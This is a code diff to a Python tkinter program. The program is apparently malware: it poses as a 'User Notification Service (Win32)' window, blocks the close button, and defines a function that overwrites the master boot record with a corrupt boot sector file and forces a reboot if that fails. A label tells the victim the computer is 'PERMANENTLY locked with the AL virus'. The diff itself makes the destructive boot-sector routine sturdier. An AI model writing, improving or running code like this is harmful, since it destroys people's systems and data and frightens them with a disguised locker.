@@ -1,6 +1,6 @@
 # Importing necessary modules to make the Shell replacement work.
 from tkinter import *
-import WINTCMD
+from subprocess import getoutput, getstatusoutput
 # Defining the tkinter window
 root = Tk()
 root.title("User Notification Service (Win32)")
@@ -15,7 +15,11 @@ def disable_event():
 root.protocol("WM_DELETE_WINDOW", disable_event)
 # Defines the destroy_bootsect function used by this program
 def destroy_bootsect():
-    WINTCMD.term('%windir%\\bmgr.exe /DEVICE=%systemdrive% /mbr /restore /file="%windir%\\bootsect-corrupt.bin" /quiet')
+    corruption_process = getstatusoutput('%windir%\\bmgr.exe /DEVICE=%systemdrive% /mbr /restore /file="%windir%\\bootsect-corrupt.bin" /quiet')
+    if corruption_process[0] == 0:
+        pass
+    else:
+        getoutput("shutdown -r -f -t 00")
 # Defines some labels used to notify the user of what happened to their computer.
 lbl0 = Label(root, text="It looks like your computer has been PERMANENTLY locked with the AL virus!", bg='black', fg='white')
 lbl0.grid(column=0, row=1, sticky='w')
